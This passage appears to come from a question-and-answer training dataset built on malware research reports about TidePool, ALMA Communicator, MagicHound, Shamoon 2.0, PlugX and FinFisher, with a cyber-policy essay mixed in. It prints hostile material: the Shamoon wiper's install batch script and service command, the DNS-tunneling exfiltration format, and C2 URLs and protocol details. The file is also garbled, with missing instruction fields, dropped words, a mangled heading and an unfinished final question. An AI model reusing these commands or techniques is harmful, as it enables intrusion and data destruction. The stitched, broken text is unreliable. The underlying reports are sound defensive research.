2012 and the creation of TidePool, a new malware family continuing in Ke3chang's custom malware footsteps. While we can't know all of the groups' attacks using TidePool or older malware, we have\nuncovered its use against Indian Embassies, which was also documented in the 2013 report, indicating this is likely a high priority target as it has continued over multiple years.\nCustomers can utilize the Ke3changResurfaces AutoFocus tag to examine the samples discussed in this post. IPS coverage for TidePool is provided by TID 14588.\n\nBased on the above text, answer a question. What key evidence supports the attribution of TidePool to the Operation Ke3chang actor, and how does this evidence align with historical patterns of Ke3chang's activities?",
    "output": "Several pieces of evidence support the attribution of TidePool to the Operation Ke3chang actor. First, there is strong behavioral overlap between TidePool and the BS2005 malware used by Ke3chang, including similar registry modifications and command and control (C2) obfuscation techniques. Second, there is significant code reuse and overlap, indicating an evolution from BS2005 to TidePool. Third, the targeting and attack methods match historic Ke3chang targeting, particularly against Indian embassies. Additionally, the encoding of binaries (0x04, LANG_CHINESE) suggests the actor's system is likely running an operating system with Chinese as the default display language, consistent with Ke3chang's origins. These factors align with historical patterns of Ke3chang's activities, reinforcing the attribution.",

    "instruction": "OilRig Deploys \"ALMA Communicator\" \u2013 DNS Tunneling Trojan\nBy Robert Falcone\nNovember 8, 2017\nUnit 42 has been closely tracking the since . One technique we've been tracking with this threat group is their use of the as attachments to spear-phishing emails in attacks since May 2016. In our April 2017 posting swe showed how we observed the OilRig threat group developing and refining these Clayside delivery documents.\nRecently, we observed a new version of the Clayslide delivery document used to install a new custom Trojan whose developer calls it \"ALMA Communicator\". The delivery document also saved the post-exploitation credential harvesting tool known as Mimikatz, which we believe the threat actors will use to gather account credentials from the compromised system. While we do not have detailed telemetry, we have reason to believe this attack targeted an individual at a public utilities company in the Middle East.\nNew Clayslide Delivery Document\nThe most recent build of Clayslide operates in a similar way to its predecessors, as it initially displays an \"Incompatible\" worksheet that states that the Excel file was created with a newer version of Excel and the user needs to \"Enable Content\" to view the document. If the user clicks \"Enable Content\", a malicious macro will run that begins by displaying a hidden worksheet that contains decoy contents, as seen in the following:\nWhile the decoy is displayed to the victim, the malicious macro accesses data from specific\ncells in the \"Incompatible\" worksheet that it concatenates to create an .HTA file, which it then saves to %PUBLIC%\\tmp.hta and opens with the mshta.exe application. The .HTA file contains HTML that will run a VBScript that finally installs the malicious payload for this attack.\nThe payload installation process begins with the .HTA file creating a folder named %PUBLIC%\\{5468973-4973-50726F6A656374-414C4D412E-2}, to which it writes three files with the following names:\nSystemSyncs.exe\nm6.e\ncfg\nThe .HTA file contains two encoded executables that it will decode and write to m6.e and SystemSyncs.exe. The .HTA file contains a base64 encoded configuration that it decodes and saves to the cfg file, which the Trojan will use to obtain the C2 domain that it will use to communicate with the threat actor. The C2 domain saved to the cfg file in this attack is prosalar[.]com.\nThe SystemSyncs.exe file (SHA256: 2fc7810a316863a5a5076bf3078ac6fad246bc8773a5fb835e0993609e5bb62e) is a custom Trojan created by the OilRig group called \"ALMA Communicator\", which we will describe in detail in the next section.\nThe \"m6.e\" file dropped by the .HTA file is a variant of Mimikatz (SHA256: 2d6f06d8ee0da16d2335f26eb18cd1f620c4db3e880efa6a5999eff53b12415c) tool. We have seen the OilRig threat group using Mimikatz for credential gathering during its post-exploitation activities, however, this is the first time we have observed the threat group delivering Mimikatz during the delivery phase of the attack. We believe the Clayslide delivery document dropped this additional tool based on the limitations of ALMA Communicator's C2 channel, which we will describe later in this report.\nThe VBScript in the .HTA file executes the SystemSyncs.exe payload and achieves persistent execution by creating a scheduled task. Unlike past Clayslide documents that create a scheduled task via the schtask application via the command prompt, the VBScript programmatically creates the task using the Schedule.Service object. The scheduled task created, as seen in Figure 1, shows that the payload will be executed every two minutes with the command line argument \"Lock\".\nALMA Communicator Trojan\nThe ALMA Communicator Trojan is a backdoor Trojan that uses DNS tunneling exclusively to receive commands from the adversary and to exfiltrate data. This Trojan specifically reads in a configuration from the cfg file that was initially created by the Clayslide delivery document. ALMA does not have an internal configuration, so the Trojan does not function without the cfg file created by the delivery document.\nAfter reading in its configuration, the Trojan creates two folders for staging, namedDownload and Upload. ALMA uses the Download folder to save batch files provided by the C2 server, which it will eventually run. ALMA uses the Upload folder to store the output of the executed batch files, which it will eventually exfiltrate to the C2 server.\nALMA Communicator uses DNS tunneling as its C2 communication channel using a specific protocol that uses specially crafted subdomains to transmit data to the C2 server and specific IPv4 addresses to transmit data from the C2 to the Trojan. The transmission of information from the Trojan to the C2 server occurs through DNS requests to resolve specially crafted subdomains on the configured C2 domain.\nTo build these specially crafted subdomains, the Trojan generates a random four-digit number and concatenates a hardcoded string of ID. The Trojan then appends a unique identifier for the compromised system to this string. To generate this unique identifier, the Trojan starts by obtaining the system's ProductId from the registry, specifically at SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductId. If it cannot find this registry key, it will use the hardcoded value 00000-00000-00000-00000. It then obtains the username and concatenates an underscore followed by the product id string. The Trojan takes the MD5 hash of this string and uses it as the basis for the unique identifier for the compromised system. It then appends the hardcoded -0-2D-2D string to finish the construction of the subdomain used to beacon the C2 server. Figure 2 shows the structure of the domains that ALMA communicator will send to the C2 server to receive data.\nTo provide a better explanation of the unique identifier generated by ALMA communication, let's consider a test system with the username and product id create the string Administrator_00000-00000-00000-00000, which results in an MD5 hash of 35ead98470edf86a1c5a1c5fb2f14e02. The Trojan will generate the unique identifier string 3d7f11b4 by taking the first, fifth, ninth, thirteenth, seventeenth, twenty first, twenty fifth and twenty ninth characters from the MD5 hash and concatenating them together, as seen in Figure 3.\nThe C2 server will reply to the beacon DNS requests with IPv4 addresses within A records. The Trojan will parse these requests for two specific IP addresses, one to mark the beginning and one to mark the end of the transmission of data from the C2 to the Trojan. The two specific IP addresses to mark the start and end of the data are:\nStart \u2013 36.37.94.33 ($%^!)\nEnd \u2013 33.33.94.94 (!!^^)\nThe C2 will respond to DNS queries between these two responses with IP addresses that the Trojan will treat as binary data. During our analysis, we observed the following data being sent from the C2 server to our analysis system, with $%^! and !!^^ representing the start and stop markers for the data:\nBased on the data sent back from the C2, the Trojan will create a file named_DnsInit.bat with commands seen in the data. The Trojan stores the batch file in the Download folder. The Trojan will then enumerate this folder and create a cmd.exe process with the path to the batch script as a command line argument. The Trojan will add to the command line argument the string \" > \" followed by the batch script's filename with the .txt.Prc file extension to write the output of the command to a text file in the Upload folder. Before running the process, the following string to the end command line argument to delete the batch script upon execution:\n\\r\\nDEL /f /q \\\"%~0\\\"|exit\nThe Trojan will then attempt to send the newly created file in theUpload folder that contains the result of running the command. The DNS requests used to send this data has four fields that are split up using a hyphen, which are:\n1. Random four-digit number followed by static \"ID\" string and the 10 character unique system identifier\n2. Number of DNS queries needed to send entire data stream\n3. Maximum of 20 characters for 10 hexadecimal bytes of data to transmit\n4. String of characters for hexadecimal bytes for filename transmitted\nTo better visualize the structure of a DNS query used to send data, the following is shows the domain name that the Trojan will build to send data to its C2 server:\n[random 4 digits]ID[unique identifier]-[number of DNS queries needed]-[string of hexadecimal bytes for sent data]-[string of hexadecimal bytes for filename being sent].prosalar[.]com\nFor example, figure 4 is the first DNS query issued after our testing system ran the _DnsInit.bat script provided by the C2 server mentioned above. As you can see, each DNS request can only send 10 bytes of data at a time, requiring 29 outbound requests to transmit the 289 bytes of output that was generated by the batch script.\nAs you can surmise, ALMA Communicator's C2 channel is rather limited when it comes to data transfer. If an actor wished to use ALMA communicator to exfiltrate large files, it would result in a very large number of outbound DNS requests, as each outbound request can only send 10 bytes at a time. Even more limiting is the data transmission from the C2 server to the Trojan, which can only send 4 bytes per DNS request, as each IPv4 address is treated as data. We believe this is the reason why the Clayslide delivery document saved the Mimikatz tool to the system instead of having the actor download the tool to the system after a successful compromise. Based on the 4-byte per DNS request limitation, the ALMA Communicator would generate 189,568 DNS requests (not including the start and stop requests) to transmit the 758,272 byte Mimikatz tool to the system, which may be detected by security systems or personnel.\nConclusion\nRead the text above and answer this question: Explain the structure and purpose of the DNS requests used by the ALMA Communicator Trojan to send data to its C2 server.",
    "output": "The ALMA Communicator Trojan uses DNS requests to send data to its C2 server, with each request structured into four fields separated by hyphens. These fields are: 1) A random four-digit number followed by the static string 'ID' and the 10-character unique system identifier; 2) The number of DNS queries needed to send the entire data stream; 3) A maximum of 20 characters representing 10 hexadecimal bytes of data to transmit; 4) A string of characters for hexadecimal bytes representing the filename being sent. For example, a DNS request might look like '[random 4 digits]ID[unique identifier]-[number of DNS queries needed]-[string of hexadecimal bytes for sent data]-[string of hexadecimal bytes for filename being sent].prosalar[.]com'. Each DNS request can only send 10 bytes of data at a time, requiring multiple requests to transmit larger amounts of data, which highlights the limited data transfer capabilities of the Trojan's C2 channel.",

To set up persistence, the loader creates a folder named \"c:\\temp\", sets its attributes to be a hidden and system folder to hide the folder from view in Windows Explorer. It then writes a file named \"rr.exe\" (SHA256: f439dee4210d623b5aa7491bad8e8d9b43305f25a5d26940eb36f6460215cf8e) to this folder and executes it with specific command line arguments.

However, as alluded to above, we believe that this adversary used the open source Magic Unicorn tool to load a shellcode-based payload. The fact that the actor used Metasploit shellcode within the Unicorn generated PowerShell script leads us to speculate that the ultimate payload of this attack is Meterpreter, which is a shellcode-based payload.\n\nQuestion: What is the purpose of the base64 encoded PowerShell command used by the MagicHound.Fetch loader, and how does it facilitate the execution of the payload?\n\nAnswer:",
    "output": "The base64 encoded PowerShell command used by the MagicHound.Fetch loader is designed to build a buffer to store shellcode and create a thread to execute it. The decoded command reveals a script that defines several DLL import functions, including VirtualAlloc, CreateThread, and memset, which are used to allocate memory, create a new thread, and copy the shellcode into memory, respectively. The shellcode is then executed by the newly created thread. This command is derived from the Magic Unicorn tool and uses Metasploit shellcode to obtain additional shellcode via an HTTP request to a specified URL. The ultimate payload is likely Meterpreter, a shellcode-based payload commonly used for post-exploitation activities. This method allows the loader to execute arbitrary code without writing it to disk, making it harder to detect using traditional antivirus solutions.",

    "instruction": "Medium Headline: Use of Macro Enabled Documents\nWhile Proofpoint has not definitively determined attribution at this time, researchers assess with moderate confidence that this campaign and a historic campaign from July 2021 were conducted by the same threat actor. The July 2021 campaign utilized a highly similar macro-laden XLS attachment to deliver MSI packages that install a Lua malware script. Similarly, the campaign utilized a very recent government report as the basis of the social engineering content and titled the malicious  \"list of participants of the briefing.xls.\" In addition to the file name being quite similar to the Asylum Ambuscade campaign, the Lua script created a nearly identical URI beacon to the SunSeed sample, which was composed of the infected victim's C Drive partition serial number. Analysis of the cryptography calls in both samples revealed that the same version of WiX 3.11.0.1528 had been utilized to create the MSI packages. Finally, the macros in this historic campaign utilized the identical technique as the Asylum Ambuscade campaign, using Windows Installer to retrieve an MSI package from an actor-controlled IP resource and suppressing indications of installation from the user. The July 2021 campaign targeted senior cyber security practitioners and decisionmakers at private US-based companies, including those in the defense sector.\nBig Headline: Conclusion: Balancing Accurate Reporting in a Timely Fashion\nThis activity, independent of attribution conclusions, represents an effort to target NATO entities with compromised Ukrainian military accounts during an active period of armed conflict between Russia, its proxies, and Ukraine. In publishing this report, Proofpoint seeks to balance the accuracy of responsible reporting with the quickest possible disclosure of actionable intelligence. The onset of hybrid conflict, including within the cyber domain, has accelerated the pace of operations and reduced the amount of time that defenders have to answer deeper questions around attribution and historical correlation to known nation-state operators. However, these are issues that Proofpoint will continue to research while\nprotecting customers globally. Proofpoint invites additional details and input around any observed activity that aligns with these reports. While the utilized techniques in this campaign are not groundbreaking individually, if deployed collectively, and during a high tempo conflict, they possess the capability to be quite effective. As the conflict continues, researchers assess similar attacks against governmental entities in NATO countries are likely. Additionally, the possibility of exploiting intelligence around refugee movements in Europe for disinformation purposes is a proven part of Russian and Belarussian-state techniques. Being aware of this threat and disclosing it publicly are paramount for cultivating awareness among targeted entities.\n\nQ: Why is it crucial for cybersecurity experts to understand the historical correlation and attribution of threat actors, especially in the context of the Asylum Ambuscade campaign, and how does this impact the effectiveness of defenses during high-tempo conflicts?",
    "output": "A: Understanding the historical correlation and attribution of threat actors is crucial because it allows cybersecurity experts to identify patterns, techniques, and tactics used by specific adversaries. In the context of the Asylum Ambuscade campaign, recognizing that the July 2021 campaign and the current campaign share similarities in the use of macro-laden XLS attachments, Lua malware scripts, and URI beacons helps in predicting future attacks and improving defenses. During high-tempo conflicts, the rapid pace of operations reduces the time available for deep analysis, making historical correlation vital for quickly identifying and mitigating threats. This awareness enables defenders to stay ahead of evolving threats and protect critical infrastructure and sensitive information more effectively.",

Technical details - Shamoon 2.0 - language usage and possible Yemeni links\nSeveral good technical articles on Shamoon 2.0 have been published by some of our colleagues, including , , and others.\nThroughout this blog we describe some of the technical details of the new Shamoon 2.0 attacks and what are the most important things that make them stand out. For the analysis we used the earliest set of samples, with a hardcoded attack date of 17 November 2016. However, we've also included details from the newer samples, such as hardcoded credentials.\nDuring deployment in the victim's environment, the main Shamoon 2.0 wiper module is installed through a Windows Batch file with the following content:\n@echo off\nset u100=ntertmgr32.exe\nset u200=service\nset u800=%~dp0 copy /Y \"%u800%%u100%\" \"%systemroot%\\system32\\%u100%\" start /b %systemroot%\\system32\\%u100% %u200%\nInterestingly, the sample resources appear to have a language ID of \"Arabic (Yemen)\", suggesting the attackers might be from Yemen. Of course, we should not disregard the possibility that the resource language could be a false flag planted there by the attackers.\nMedium Headline: 2.1. 32-bit Shamoon dropper/worm (ntssrvr32.exe)\nThis executable is a worm designed to infect computers connected to a Windows domain. To achieve this, it relies on a list of hardcoded, previously stolen username/password pairs belonging to administrators of the targeted domain. All the strings in the malware are obfuscated with simple one byte ADD operations and are decrypted upon execution. All the dropped files exhibit file times altered to match that of the system's kernel32.dll. The module only works if it is run with exactly one command line parameter, regardless of the parameter. Otherwise, it simply exits (likely a measure to avoid accidental execution).\nSmall Headline: The hardcoded credentials we have observed so far are:\nIf the victim host's system \"PROCESSOR_ARCHITECTURE\" environment variable is \"AMD64\" or \"amd64\", the module installs its 64-bit variant. The variant is contained within a resource\nnamed \"X509\". The resource is de-XORed and dropped onto the system under: <%WindowsDir%\\system32\\ntssrvr64.exe>.\nIt is then installed as a service via the command:\n\"cmd.exe /c \"ping -n 30 127.0.0.1 >nul && sc config NtsSrv binpath= \"C:\\WINDOWS\\system32\\ntssrvr64.exe LocalService\" && ping -n 10 127.0.0.1 >nul && sc start NtsSrv\"\nSmall Headline: 2.1.2. Worm Functionality\nOnce this module runs (as a service), the worm-spreading functionality is started, targeting every network host within the IPv4 address range, with the same first three bytes of the victim's IP and the last byte in the range from 0 to 255, thus operating inside subnet class C (a.b.c.0/24).\nHere's how it works:\n1. The worm connects to a remote machine's registry and disables Remote UAC by setting the LocalAccountTokenFilterPolicy registry key value to 1 in HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies \\system.\n2. If the RemoteRegistry system service is disabled and doesn't run on the target system, the worm reconfigures this service to be auto-started and then starts it immediately. If the connection to a remote registry is unsuccessful, the worm repeats the connection attempt with a hardcoded set of stolen domain administrator credentials. The worm then searches for remote \"\\windows\\system32\\csrss.exe\" files by prepending this path with the victim machine's IP as well as system shares: \"ADMIN$\", \"C$\", \"D$\", \"E$\".\n3. Once a remote system32 folder is found, the worm copies itself into this folder under the name \"ntssrvr32.exe\". It schedules a remote job to run \"ntssrvr32.exe LocalService\" after 90 seconds.\n4. If the remote scheduler is inaccessible, the worm tries to set up NtsSrv and runs the service on the remote machine with the same parameters as it used for self-installation. Attempts with stolen credentials are also performed.\n5. An alternative but similar infection method is coded into the worm, where each infection is performed in a separate thread without relying on the scheduler; but it is not used at this time.\nAnswer this question: In the context of the Shamoon 2.0 attacks, how does the worm functionality operate to spread across a network, and what specific steps does it take to ensure successful propagation?",
    "output": "The worm functionality in Shamoon 2.0 operates by targeting every network host within the IPv4 address range of the victim's subnet class C (a.b.c.0/24). Here\u2019s a step-by-step breakdown of its operation: 1. The worm connects to a remote machine's registry and disables Remote UAC by setting the LocalAccountTokenFilterPolicy registry key value to 1. 2. If the RemoteRegistry system service is disabled, the worm reconfigures it to auto-start and then starts it immediately. If the connection to a remote registry is unsuccessful, the worm uses hardcoded stolen domain administrator credentials to retry the connection. 3. The worm searches for remote '\\\\windows\\\\system32\\\\csrss.exe' files by prepending this path with the victim machine's IP and system shares like 'ADMIN$', 'C$', 'D$', 'E$'. 4. Once a remote system32 folder is found, the worm copies itself into this folder under the name 'ntssrvr32.exe' and schedules a remote job to run 'ntssrvr32.exe LocalService' after 90 seconds. 5.

The trojan checks for the c:\\windows\\inf\\mdmslbv.inf file. If it exists, the trojan starts reading. You can use the following script to decrypt:\nEncrypted file's length\nThe packet's structure:\n\u00b7 random string from 10 to 19 characters long\n\u00b7 between the <a>...</a> tags contains the backdoor process's PID\n\u00b7 between the <b>...</b> tags is the process's name\n\u00b7 random string from 10 to 19 characters long\nThe trojan checks for the existence of a process with the specified parameters. If it finds it, the trojan terminates its work.\nIf it doesn't find a process with the specified parameters or the mdmslbv.inf file itself, the trojan generates data as shown above. Then, it encrypts and writes to the c: \\windows\\inf\\mdmslbv.inf.\nCommunication with the command and control server\nThe trojan has command and control server: blog[.]globnewsline[.]com.\nThe trojan sends a GET request to the following URL: hxxps://blog.globnewsline.com:443/db/db.asp using User-Agent \"Mozilla/5.0 (X11; Windows x86_64; rv:70.0) Gecko/20100101 Firefox/70.0\". If the server response contains the substring Website under construction, then the trojan considers that the control server is available. If the server is unavailable, the malicious code checks for the presence of a proxy configuration file c:\\windows\\inf\\bksotw.inf. If that's present, the trojan reads the parameters written in the file.\nThe backdoor uses MAC addresses as the network interface bot ID. For heartbeat requests, the following POST requests are used:\nwhere <macaddr> is the MAC address string, converted to uppercase with colons removed.\nNext, a GET request is sent to get a list of commands:\nThe server response is encrypted in the same way as the file with the backdoor process's PID.\nThe following commands can be executed:\n\u00b7 up\n\u00b7 down\n\u00b7 bg\n\u00b7 bgd\n\u00b7 getinfo\nThe command's result is encrypted the same way as the command itself was encrypted. Then, it's sent in the POST request's body to the following URL:\nSmall Headline: Preparing procedures\nAt the beginning of the work, the backdoor decrypts the overlay provided by the shellcode. The first encryption layer is removed by the following algorithm:\nThe second layer is the XOR operation with the key 0xCC.\nThis overlay contains:\n\u00b7 configuration of trojan\n\u00b7 module for bypassing UAC\nConfiguration looks as follows:\nThe flags field displays which autoload methods the trojan should use, and what launch features are:\nIf the launch is specified via the task scheduler (INSTALL_AS_MSTASK), then the configuration flags creates a mutex after decrypting. That prevents restart:\nNext, it checks if the trojan has enough rights to launch in the way that was previously specified in the configuration. If not, it restarts itself to bypass UAC.\nTrojan checks for the presence of a file in the path\nIf the clockinstall.tmp file is missing, it checks if the install file exists in the folder from which the trojan was launched. If it exists, it removes it.\nThen, it installs itself into the system in accordance with the type specified in the configuration. The backdoor will also try to hide its activity from the user.\nIf the trojan runs on a 32-bit OS, then the same mechanism for hiding a service from running ones is valid, as in , deleting that structure from the list of ServiceDatabase structures. That corresponds to the trojan service.\nIf the configuration specifies that the trojan should be injected into a process, then it'll be injected into the target process. If the RUN_AS_USER flag is specified in the configuration, then the trojan will wait until at least one authorized user appears. After that, it'll create its own process, but on behalf of the user.\nRegardless of the trojan's autorun type, only one process can communicate with the command and control server. This creates a mutex:\nBefore attempting to establish a connection with the command and control server, trojan determines the proxy server settings. For this purpose:\n\u00b7 The presence of the <process_name>.ini file in the folder from which the trojan process was launched is checked. Example of the configuration:\n\u00b7 Reads a file named <loader_name>.tmp in the trojan folder, where <loader_name> is the value from the configuration\n\u00b7 Reads proxy settings from registry [HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings, keys ProxyEnable and ProxyServer\n\u00b7 Reads proxy settings from Mozilla Firefox settings - %APPDATA% \\Mozilla\\Firefox\\<profile>\\prefs.js\n\u00b7 Checks for stored login:password from the proxy server in Mozilla Firefox and Internet Explorer\nSmall Headline: Control server protocol\nEstablishing a connection to the server mimics the creation of a TLS1.0 connection between the client and the server. Trojan body contains two buffers:\n1. Contains the TLS1.0 Client Hello package:\n2. Contains TLS 1.0 Client Key Exchange packets with key length 0x100 bytes, Change Cipher Spec, Client Handshake Finished:\nWhen sending a Client Hello packet, the trojan encrypts all bytes of the Client Random field, starting from the 4th one, using the XOR method with random bytes. It also records the current time in the first 4. The server's response to this message is accepted, but the data is ignored.\nWhen sending the second packet, the backdoor also encrypts the Client Key Exchange packet's public key field using the XOR method with random bytes, and writes its 28-byte key into the data of the Client Handshake Finished packet. That'll be used to encrypt and decrypt packets sent or received from the server. The backdoor encrypts the last 4 bytes of the Client Handshake Finished packet with random bytes. Then, it sends it to the command and control server. In response, the server sends its own key. That key is used to initialize the key shared with the client.\nAfter that, the backdoor enters the command processing cycle from the control server. The traffic between the client and the server is encrypted using the RC4 algorithm.\nThe list of commands:\nAnswer this question: Explain the operating principle of BackDoor.PlugX.93, particularly focusing on how it changes memory permissions and decrypts its code.

Cyber countermeasures can be taken at the international level, followed by cyber defences at the national level, and\nending with actions that an individual computer user can make to improve cyber defence.\nThe International Telecommunication Union (ITU), the organization within the UN that is responsible for the international oversight of the world's telephone system, is developing a system for oversight of the internet. The ITU is working towards a convention against cybercrime that will provide international cooperation on issues concerning internet communications (Schrank, 2007). Members of the international community will need to work together in order to track and prosecute cyber criminals that operate outside of the country that is being attacked. Nations will also have to work together to share technical data to maintain cyber defences to keep up with the newest and ever changing cyber attacks. Hackers routinely share information on new techniques that can penetrate IT defence structures. Nations need to do the same to protect their own IT infrastructure, the same IT structure that affects the entire globe (Lipson, 2002:47-48).\nIndividual countries can improve their cyber defences within their own boundaries which would also improve the cyber security of the international IT system. Countries can make laws making cyber crimes illegal with punishments and programs that will deter potential cyber criminals. Governments can create a system that increases co-operation between the government, businesses, and academic institutions in order to improve their cyber defences. This co-operation could lead to an IT infrastructure that is resilient and able to withstand and recover from a cyber attack with little or no permanent damage to a country's IT structure. (Schrank, 2007)\nIn 8th section the computer user was identified as the weakest link in an IT system. Some individual countermeasures are easy to accomplish for any computer user. Actions like keeping antivirus and anti-spyware software up to date along with updating your web browser and operating system can greatly enhance your own computer security. Even following safe computer practices of not opening unknown attachments on emails that may carry viruses or malware are very instrumental in making the cyber environment more secure (Secure Works Press Release, 2008). The U.S. Department of Homeland Security (DHS) has tips for computer users posted on their website to increase internet security. The main points of the DHS website are to promote personal responsibility for increasing\ncyber security and to promote best practices for safe computer usage. The best practices that DHS advertises are to make cyber security a habit by following three core practices. The three core practices are to \"install anti-virus and anti-spyware programs and keep them up to date, install a firewall and keep it properly configured, and to regularly install updates on your computer's operating system\" (Homeland Security, 2008). Computer users are the first line of defence in cyber security and their actions can help protect the cyber infrastructure that is used by all.\nBig Headline: Conclusion\nThe international system is lacking in its ability to effectively manage issues of cyber security. The Russian Federation is perceived by the international community as a country that engages in or supports groups that are involved in cyber crime. International and regional organizations along with countries that interact with the Russian Federation have to deal with a reality that they may be the target of a cyber attack if they are in opposition to the government of the Russian Federation.\nThe issue of cyber security is ongoing. As more of the former Soviet satellites become more developed with an advanced IT structure they will have to face the realities of cyber attacks. Regardless of whether the government of the Russia Federation has been involved in any cyber attacks, or will be in the future, the reality remains that nations, groups, or individuals that are in opposition to Russia may face a cyber attack. The cyber attacks will be used to influence public opinion or to influence government leaders through the use of cyber pressure. Future conflicts that involve the use of force will also see cyber attacks in conjunction with combat operations. Currently international agreements and laws are inadequate which allows cyber attackers to take advantage of the lack of such laws and can conduct acts of civil disobedience on the internet.\nThe conflict in Georgia has been a motivator for military reform which includes reform in the cyber arena. The Russian government and the Russian military will continue to develop systems to improve both their offensive and defensive cyber capabilities. Russia will continue to capitalize on their diaspora present throughout the world to support their political positions but will have to realize that some of that diaspora will be in opposition to them and provide private support to organizations and nations that have received cyber attacks. Russia's active collection of cyber\ndefence secrets will also be a combat multiplier for them in future conflicts either alone in the cyber world or as part of a ground conflict.\nOrganizations and nations will be best served by creating a resilient defence in depth while educating users and managers of IT systems in best practices to counter the threat of a cyber attack. This defence in depth includes technical responses to counter the threats while ensuring that their IT systems are resilient and become effective after an attack. President Bush remarked in 2001 that, \"It's time to work together to address the new security threats that we all face. And those threats are not simply missiles or weapons of mass destruction in the hands of untrustworthy countries. Cyber-terrorism is a threat, and we need to work on that together\" (Verton, 2003:248).\nAnswer this question: What specific measures can individual countries take to enhance their cyber defenses and contribute to global cyber security?",
    "output": "Individual countries can enhance their cyber defenses by implementing several measures within their own boundaries, which also improves global cyber security. Countries can enact laws making cyber crimes illegal with punishments and programs that deter potential cyber criminals. Governments can create systems that increase cooperation between the government, businesses, and academic institutions to improve cyber defenses. This cooperation can lead to an IT infrastructure that is resilient and able to withstand and recover from a cyber attack with little or no permanent damage to a country's IT structure. Additionally, promoting best practices for safe computer usage among citizens can significantly enhance overall cyber security.",

We devise a method for querying FinFisher's \"anonymizing proxies\" to unmask the true location of the spyware's master servers. Since the master servers are installed on the premises of FinFisher customers, tracing the servers allows us to identify which governments are likely using FinFisher. In some cases, we can trace the servers to specific entities inside a government by correlating our scan results with publicly available sources. Our results indicate 32 countries where at least one government entity is likely using the spyware suite, and we are further able to identify 10 entities by name. Despite the 2014 FinFisher breach, and subsequent disclosure of sensitive customer data, our scanning has detected more servers in more countries than ever before.\nBig Headline: Part 1: Fishing for FinFisher\nIn this section, we describe our scans for FinFisher servers, and how we unmasked the true location of the master servers to identify governments using FinFisher.\nEach FinFisher sample includes the address of one or more C&C servers that the spyware reports back to. These C&C servers are typically FinSpy Relays, which forward connections back and forth between a device infected with FinFisher, and a FinSpy Master. The purpose of the FinSpy Relay is explicitly to make it \"practically impossible\" (their emphasis) for a researcher to discover \"the location and country of the Headquarter [sic]\".\nFigure 1: How targets infected with FinFisher communicate with the FinSpy Master via one or more FinSpy Relays.\nWe employed zmap to scan the entire IPv4 Internet (/0) several times since the end of December 2014 and throughout 2015, using a new FinFisher server fingerprint that we devised by analyzing FinFisher samples. Our scans yielded 135 servers matching our fingerprint, which we believe are a mix of FinSpy Masters and FinSpy Relays.\nWhen one queries a FinFisher server, or types the server's address into a web browser, the server typically returns a decoy page. A decoy page is a page designed to disguise the fact that the server is a spyware server. We found some variation in the decoy pages used by FinFisher servers that we detected, though the bulk used either www.google.com or www.yahoo.com. Peculiarly, FinSpy Relays appear to return decoy pages fetched by their FinSpy Master, rather than directly fetching the decoy pages themselves. Thus, in many cases, the pages returned by the FinSpy Relays contain location data apparently about the FinSpy Master (e.g., certain Google and Yahoo pages embed the requester's IP address or localized weather), which can reveal the location of FinSpy Masters.\nMedium Headline: Okay Google, What is my IP?\nWe noticed that when we issued a query like \"What is my IP address?\" to a Google\u00addecoy FinFisher server, the server would respond with a different IP address. In the case below, a FinFisher server 206.190.159.xxx (located in the United States) reported that its IP address was the Indonesian IP 112.78.143.xxx, which matches a FinFisher server first detected in August 2012 by\nClaudio Guarnieri. We hypothesize that 206.190.159.xxx is a FinFisher proxy, designed to obscure the location of the FinFisher master, which is at 112.78.143.xxx.\nSpecifically, we sent queries of the form:\nGET /search?q=my+ip+address&nord=1 HTTP/1.1\nHost: [ip of server]\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0\nFigure 3: Queries we sent to Google\u00addecoy FinFisher servers to reveal the IP address of the master.\nThe fact that FinFisher proxies can apparently reveal the IP of the master is quite peculiar. We illustrate below how we believe a query like \"What is my IP address?\" is routed through FinSpy Relays to the FinSpy Master:\nIt appears that the \"What is my IP Address?\" query is delivered from our Measurement Machine by the FinSpy Relay to the FinSpy Master, and then submitted to Google by the FinSpy Master. Therefore, Google returns the IP address of the FinSpy Master, which is then sent back to the Measurement Machine via the FinSpy Relay.\nMedium Headline: How's the Weather in Caracas?\nA significant number of FinFisher servers we detected used www.yahoo.com as their decoy page. While we were unable to devise a method to find the exact IP address of Yahoo\u00addecoy FinFisher endpoints, we were still able to retrieve location information from Yahoo, by examining the userLocation object in the decoy page's source code. Yahoo utilizes a user's location to customize several elements of Yahoo's homepage, including weather and news.\nThe userLocation object returned by 185.8.106.xxx (located in Lithuania) is shown below:\nThe userLocation object allows us to obtain city and country information for FinFisher endpoints, though we cannot determine their precise IP address. We issued a query similar to the following to each Yahoo\u00addecoy FinFisher server to obtain a page with the userLocation object:\nFigure 7: Queries we sent to Yahoo\u00addecoy FinFisher servers to reveal the location of the master.\nSince Yahoo, like Google, implements SSL redirection by default, we had to devise a method to talk to Yahoo in plain HTTP. While Google provides the \"nord=1\" URL parameter to avoid SSL redirection, Yahoo apparently does not have an analogous publicized solution. However, we found that by sending plain HTTP GET requests to the resource \"https://www.yahoo.com/\" we could communicate with www.yahoo.com in plain HTTP without triggering SSL redirection.\nMedium Headline: Other Decoys\nWhile the majority of FinFisher servers we detected used either Google or Yahoo as a decoy page, we identified a number of other servers whose operators had apparently customized the decoy page to a different URL.\nOne server used the Italian news source libero.it as a decoy. We noted that libero.it sets the \"Libero\" cookie, which contains the IP address of the computer that visited the libero.it website. When accessing 185.8.106.xxx, the Libero\u00addecoy FinFisher server, the cookie was set to include the Italian IP 93.146.250.xxx.Servers that we traced to Macedonia used Macedonian newsmagazine time.mk as a decoy. Servers we traced to Taiwan used Taiwanese web portal pchome.com.tw as a decoy. We were unable to trace other servers which used file download site filehippo.com as a decoy. A handful of other untraceable servers returned custom HTML code as a decoy (e.g., a webpage with a META redirect to www.google.com).\nMedium Headline: General Comments\nThis design peculiarity is only the latest instance of fingerprintable anomalies in spyware decoy pages. FinFisher competitor Hacking Team formerly used decoy pages on its C&C server for Remote Control System (RCS), but apparently removed them after our research revealed that anomalies in the decoy pages could be used to fingerprint RCS servers. We have also previously used decoy pages to fingerprint FinFisher servers. We believe that FinFisher or its clients may also be realizing that decoy pages are problematic, as we have observed fewer FinFisher servers returning decoy pages over time.\nP t 2: C t Fi di\nRead the text above and answer this question: How did the researchers handle Yahoo-decoy FinFisher servers to gather location information about the master servers? What challenges did they face and how were they 